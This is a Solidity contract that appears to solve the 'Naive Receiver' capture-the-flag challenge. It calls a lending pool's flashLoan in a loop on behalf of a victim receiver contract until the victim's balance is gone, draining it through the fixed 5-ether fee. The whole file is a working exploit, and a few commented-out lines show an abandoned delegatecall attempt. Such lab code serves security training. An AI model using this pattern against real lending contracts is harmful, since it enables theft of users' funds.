pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract AttackContract {
  uint256 public constant FIXED_FEE = 5 ether;

  FlashLoanReceiver public receiver;
  NaiveReceiverLenderPool public pool;

  constructor(address payable _poolAddress, address payable _receiverAddress) public {
    pool = NaiveReceiverLenderPool(_poolAddress);
    receiver = FlashLoanReceiver(_receiverAddress);
  }

  function callFlashLoan (address payable borrower, uint256 borrowAmount) public {

    while (address(receiver).balance > 0) {
      (bool success, ) = address(pool).call(
        abi.encodeWithSignature(
            "flashLoan(address,uint256)",
            borrower,
            borrowAmount
        )
      );
    require(success, "External call failed");
    }

    // pool.flashLoan(borrower, borrowAmount);

    // (bool success, ) = address(pool).delegatecall(
    //   abi.encodeWithSignature(
    //     "flashLoan(address,uint256)",
    //     borrower,
    //     borrowAmount
    //     )
    //     );
    //
    //     require(success, "Delegate call failed :(");
  }

  function findPoolAddress () public view returns (address) {
    return (address(pool));
  }

  function findReceiverAddress () public view returns (address) {
    return (address(receiver));
  }

  receive () external payable {}

}
